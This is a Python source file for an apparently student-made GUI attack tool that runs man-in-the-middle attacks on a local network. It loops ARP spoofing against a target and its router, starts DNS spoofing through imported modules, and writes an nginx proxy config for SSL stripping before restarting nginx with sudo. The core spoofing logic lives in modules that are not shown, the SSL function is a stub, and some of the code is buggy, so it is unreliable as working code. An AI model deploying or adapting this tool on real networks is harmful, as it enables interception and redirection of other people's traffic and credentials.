import PySimpleGUI27 as sg
import sys
from scapy.all import *
import os
import logging as logging
from netfilterqueue import NetfilterQueue
import threading
import ARP
import dns4

# setconfigfile("estctwist.nl", "/etc/nginx/sites-enabled/default.conf")
def setconfigfile(website, path):
    f = open(path, "w")
    f.write("""
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root /var/www/html;
    server_name _;
    location / {
        try_files $uri $uri/ =404;
        proxy_pass https://{hostname}
    }
}
""".format(hostname = website))
    f.close()
    os.system("sudo service nginx restart")

attackerIp = 0 #ip adress attacker, automatic, interface as GUI variable
TargetIP = '10.0.123.4' #GUI variable, target ip
RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
targetIp = TargetIP
hostIp = RouterIP #host = router
includeSSL = False
guessIP = '10.0.123.'
silent = True
website = "google.com"
path = 'default'
inf = 'enp0s10'
websiteSSL = "google.com."
spoofIP = "157.240.201.35"
queueNum = 1

choice1 = sg.Checkbox("SSL Stripping", default=False)
t1 = sg.Input('', enable_events=True, key='-INPUT-', font=('Arial Bold', 20), justification='left')
t2 = sg.Input('', enable_events=True, key='-INPUT2-', font=('Arial Bold', 20), justification='left')
t3 = sg.Input('', enable_events=True, key='-INPUT3-', font=('Arial Bold', 20), justification='left')
t4 = sg.Input('', enable_events=True, key='-INPUT4-', font=('Arial Bold', 20), justification='left')
t5 = sg.Input('', enable_events=True, key='-INPUT5-', font=('Arial Bold', 20), justification='left')
t6 = sg.Input('', enable_events=True, key='-INPUT6-', font=('Arial Bold', 20), justification='left')
t7 = sg.Input('', enable_events=True, key='-INPUT7-', font=('Arial Bold', 20), justification='left')

choice2 = sg.Checkbox("ARP Silent mode", default=False)
text1 = sg.Text("Do you want to include SSL stripping?")
text2 = sg.Text("Insert target IP")
text3 = sg.Text("Insert target domain")
text4 = sg.Text("Insert network interface")
text5 = sg.Text("DNS Silent mode")
text5 = sg.Text("Website to spoof")
text6 = sg.Text("IP to spoof (DNS)")
text7 = sg.Text("Enter website (SSL)")
text8 = sg.Text("Enter path (SSL)")

endButton = sg.Button("End attack", visible = False)
attackButton = sg.Button("Attack!")
    
layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [text5], [t4], [text6], [t5], [text7], [t6], [text8], [t7], [attackButton], [endButton]]
window = sg.Window("Attack", layout)

def ARPLoop():
    try:
        while True:
            if silent == False:
                ARP.full_spoof(guessIP, hostIp, attackerIp, inf)
            else:
                ARP.spoof(targetIp, hostIp, attackerIp, inf)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print('stopping attack')
        ARP.end_spoof(targetIp, hostIp, attackerIp, inf)
        ARP.end_spoof(hostIp, targetIp, attackerIp, inf)
 
def DNSLoop():        
    if __name__ == '__main__':
        try:
            print website
            spoof = dns4.DNSSpoof(website, spoofIP, queueNum, targetIp)
            spoof()
        except OSError as error:
            log.error(error)

def SSLLoop():
    #SSL code
    print("SSL Test")

def guess(targetIP):
    y = 0
    z = 0
    for x in targetIP:
        if x in ["."]:
            y = y + 1
        if y == 3:
            z = z + 1
    z = z - 1
    guessIP = targetIP[:-z]
    return guessIP

while True:
    event, values = window.read()
    if event == "Attack!" or event == None:
        includeSSL = values[0]
        silent = values[1]
        TargetIP = layout[3][0].get()
        RouterIP = layout[5][0].get()
        targetIp = TargetIP
        hostIp = RouterIP
        website = layout[9][0].get()
        spoofIP = layout[11][0].get()
        websiteSSL = layout[13][0].get()
        path = layout[15][0].get()
        guessIP = guess(TargetIP)
        inf = layout[7][0].get()
        
        attackerIp = get_if_addr(layout[7][0].get())
        
        print includeSSL, silent, TargetIP, RouterIP, website, spoofIP, websiteSSL, path, guessIP, inf
        
        thread1 = threading.Thread(target=ARPLoop);
        thread1.start(); 
        
        thread2 = threading.Thread(target=DNSLoop);
        thread2.start();
        
        if includeSSL == True:
            thread3 = threading.Thread(target=SSLLoop);
            thread3.start();
        
        endButton = sg.Button("End attack", visible = True);
        window['End attack'].update(visible = True)
        window['Attack!'].update(visible = False)
        
    if event == "End attack" or event == None:
        ARP.end_spoof(targetIp, hostIp, attackerIp, inf)
        ARP.end_spoof(hostIp, targetIp, attackerIp, inf)   
        
window.close()
